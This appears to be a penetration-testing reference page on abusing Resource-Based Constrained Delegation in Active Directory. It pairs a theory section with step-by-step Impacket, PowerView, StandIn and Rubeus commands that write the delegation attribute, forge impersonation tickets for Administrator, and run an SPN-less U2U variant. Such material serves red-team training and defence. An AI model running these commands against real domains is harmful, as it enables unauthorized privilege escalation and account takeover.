## Thoery
If an account, having the capability to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of another object (e.g. the `GenericWrite` ACE, see Abusing ACLs), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.
!!! note
    Machine accounts can edit their own `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, hence allowing RBCD attacks on relayed machine accounts authentications.

For this attack to work, the attacker needs to populate the target attribute with the SID of an account that Kerberos can consider as a service. A service ticket will be asked for it. In short, the account must be either (see Kerberos tickets for more information about the following):

- a user account having a `ServicePrincipalName` set
- an account with a trailing `$` in the `sAMAccountName` (i.e. a computer accounts)
- any other account and conduct SPN-less RBCD with U2U (User-to-User) authentication

The common way to conduct these attacks is to create a computer account. This is usually possible thanks to a domain-level attribute called `MachineAccountQuota` that allows regular users to create up to 10 computer accounts.

Then, in order to abuse this, the attacker has to control the account (A) the target object's (B) attribute has been populated with. Using that account's (A) credentials, the attacker can obtain a ticket through S4U2Self and S4U2Proxy requests, just like constrained delegation with protocol transition.

In the end, an RBCD abuse results in a Service Ticket to authenticate on the target service (B) on behalf of a user. Once the final Service Ticket is obtained, it can be used with Pass-the-Ticket to access the target service (B).

For more information, check this [article](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
## Exploit
=== "UNIX-like"
    **Step 1: edit the target's "rbcd" attribute (DACL abuse)**

    Impacket's rbcd.py script (Python) can be used to read, write or clear the delegation rights, using the credentials of a domain user that has the needed permissions.
    ```bash
    # Read the attribute
    rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'

    # Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
    rbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'
    ```
    **Step 2: obtain a ticket (delegation operation)**

    Once the attribute has been modified, the Impacket script getST (Python) can then perform all the necessary steps to obtain the final "impersonating" ST (in this case, "Administrator" is impersonated but it can be any user in the environment)
    ```bash
    getST.py -spn 'cifs/target' -impersonate Administrator -dc-ip 'DomainController' 'domain/controlledaccountwithSPN:SomePassword'
    ```
    **Step 3: Pass-the-ticket**

    Once the ticket is obtained, it can be used with pass-the-ticket.
=== "Windows"
    **Step 1: edit the target's "rbcd" attribute (DACL abuse)**

    The PowerShell ActiveDirectory module's cmdlets Set-ADComputer and Get-ADComputer can be used to write and read the attributed of an object (in this case, to modify the delegation rights).
    ```bash
    # Read the security descriptor
    Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount

    # Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
    Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'controlledaccountwithSPN'
    ```
    PowerSploit's PowerView module is an alternative that can be used to edit the attribute.

    ```bash
    # Obtain the SID of the controlled account with SPN (e.g. Computer account)
    $ComputerSid = Get-DomainComputer "controlledaccountwithSPN" -Properties objectsid | Select -Expand objectsid

    # Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)

    # set SD in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the target comptuer account
    Get-DomainComputer "target$" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
    ```

    FuzzSecurity's [StandIn](https://github.com/FuzzySecurity/StandIn) project is another alternative in C# (.NET assembly) to edit the attribute (source).
    ```bash
    # Obtain the SID of the controlled account with SPN (e.g. Computer account)
    StandIn.exe --object samaccountname=controlledaccountwithSPNName

    # Add the object to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer
    StandIn.exe --computer "target" --sid "controlledaccountwithSPN's SID"
    ```
    **Step 2: obtain a ticket (delegation operation)**

    Rubeus can then be used to request the TGT and "impersonation ST", and inject it for later use.
    ```bash
    # Request a TGT for the current user
    Rubeus.exe tgtdeleg /nowrap
    # OR - Request a TGT for a specific account
    Rubeus.exe asktgt /user:"controlledaccountwithSPN" /aes256:$aesKey /nowrap

    # Request the "impersonation" service ticket using RC4 Key
    Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"cifs/target" /domain:"domain" /user:"controlledaccountwithSPN" /rc4:$NThash
    # OR - Request the "impersonation" service ticket using TGT Ticket of the controlledaccountwithSPN
    Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"host/target" /altservice:cifs,ldap /domain:"domain" /user:"controlledaccountwithSPN" /ticket:$kirbiB64tgt
    ```
    The NT hash and AES keys can be computed as follows.

    ```bash
    Rubeus.exe hash /password:$password
    Rubeus.exe hash /user:$username /domain:"domain.local" /password:$password
    ```
    **Step 3: Pass-the-ticket**

    Once the ticket is injected, it can natively be used when accessing the service.

### RBCD on SPN-less users
The technique is as follows:

1. Obtain a TGT for the SPN-less user allowed to delegate to a target and retrieve the TGT session key.
2. Change the user's password hash and set it to the TGT session key.
3. Combine S4U2self and U2U so that the SPN-less user can obtain a service ticket to itself, on behalf of another (powerful) user, and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to, on behalf of the other, more powerful, user.
4. Pass the ticket and access the target, as the delegated other

!!! note
    While this technique allows for an abuse of the RBCD primitive, even when the `MachineAccountQuota` is set to 0, or when the absence of LDAPS limits the creation of computer accounts, it requires a sacrificial user account. In the abuse process, the user account's password hash will be reset with another hash that has no known plaintext, effectively preventing regular users from using this account.
=== "UNIX-like"
    From UNIX-like systems, Impacket (Python) scripts can be used to operate that technique
    ```bash
    # Obtain a TGT through overpass-the-hash to use RC4
    getTGT.py -hashes :$(pypykatz crypto nt 'SomePassword') 'domain'/'controlledaccountwithoutSPN'

    # Obtain the TGT session key
    describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'

    # Change the controlledaccountwithoutSPN's NT hash with the TGT session key
    changepasswd.py -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'

    # Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)
    KRB5CCNAME='TGT.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/target.domain.com" -k -no-pass 'domain'/'controlledaccountwithoutSPN'

    # The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
    smbpasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
    ```
    After these steps, the final service ticket can be used with Pass-the-ticket.
